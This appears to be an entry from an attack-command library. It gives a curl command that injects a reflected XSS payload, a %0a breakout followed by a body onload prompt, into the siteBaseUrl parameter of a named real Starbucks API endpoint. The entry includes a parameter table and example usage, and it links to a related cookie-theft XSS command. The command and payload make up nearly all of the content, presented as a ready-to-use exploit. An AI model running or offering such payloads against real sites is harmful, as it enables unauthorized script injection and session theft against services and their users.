---
data: >-
  curl
  "https://openapi.starbucks.com/searchasyoutype/v1/search?x-api-key=██████&query=coffe&partnerid=████:vwt2u5wngbk&siteBaseUrl=http://googl.com/%0a<body
  onload=prompt(document.domain)>"
tags:
  - xss
  - exploit
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:11.116Z'
id: 94f3f20a-7ec9-4feb-a968-8fa65b5e1bf0
verified: false
validated: true
submitted: true
---
# inject-xss-payload-sitebaseurl

## Command

```bash
curl "https://openapi.starbucks.com/searchasyoutype/v1/search?x-api-key=██████&query=coffe&partnerid=████:vwt2u5wngbk&siteBaseUrl=http://googl.com/%0a<body onload=prompt(document.domain)>"
```

## Description

Injects an XSS payload into siteBaseUrl to execute a prompt showing the document domain.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| siteBaseUrl | Encoded payload with %0a breakout | Yes |

## Examples

### Basic Usage

```bash
curl "https://openapi.starbucks.com/searchasyoutype/v1/search?x-api-key=yourkey&query=coffe&partnerid=yourid&siteBaseUrl=http://googl.com/%0a<body onload=prompt(document.domain)>"
```

## Expected Output

JavaScript alert popup displaying the document domain upon browser execution.

## Related

- [[commands/inject-cookie-theft-xss]]
